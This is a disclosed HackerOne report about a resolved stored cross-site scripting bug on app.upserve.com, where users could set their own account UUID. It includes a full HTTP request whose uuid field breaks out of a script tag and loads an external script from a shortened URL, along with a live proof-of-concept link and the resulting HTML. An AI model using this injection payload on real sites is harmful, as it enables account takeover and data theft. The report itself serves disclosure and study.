---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '249131'
original_report_id: '249131'
title: Ability to create own account UUID leads to stored XSS
weakness: Cross-site Scripting (XSS) - Stored
team_handle: upserve
created_at: '2017-07-13T05:57:02.081Z'
disclosed_at: '2019-06-10T15:50:36.553Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 198
asset_identifier: app.upserve.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-stored
---

# Ability to create own account UUID leads to stored XSS

## Metadata

- HackerOne Report ID: 249131
- Weakness: Cross-site Scripting (XSS) - Stored
- Program: upserve
- Disclosed At: 2019-06-10T15:50:36.553Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

I found an interesting bug where the system allows a user to create their own UUIDs. There are character length restrictions on this action, however it's not bound to a specific set of characters. Even so, I was able to include an external script that I URL shortened to just hit the character limit exactly. I was lucky I didn't need to add the closing script tag, because the one at the end of the line takes care of it. I wanted to get a full PoC rather than an `alert(1)`, because I think it could have been argued that the space was too small to actually do anything meaningful with.

This attack is similar in the way to #246806, except I'm quite confident this will be executed on admin panels and anywhere else a UUID is displayed, since sanitization on that attribute is highly unlikely.

**PoC**
Just replace the email with the one you own, and click the email confirmation link.
```
POST /c/user HTTP/1.1
Host: app.upserve.com
Accept: application/json
Accept-Language: en-US,en;q=0.5
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Referer: https://app.upserve.com/settings/account
Content-Length: 134
Content-Type: text/plain;charset=UTF-8
DNT: 1
Connection: close

uuid=</script><script src=//is.gd/z0i2sU>&email=[YOUR EMAIL]&brand_pretty_url=ace-wasabis-rock-n-roll-sushi
```

**Live PoC**
Visit the following page: https://app.upserve.com/b/ace-wasabis-rock-n-roll-sushi?email_token=2aa7296c678e11e7ab2f0242ac110002

The generated HTML looks like:
`YUI.namespace('Env.DATA').consumer = {"uuid":"</script><script src=//is.gd/z0i2sU>","firstName":null,`

Thanks,
-- Tanner

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
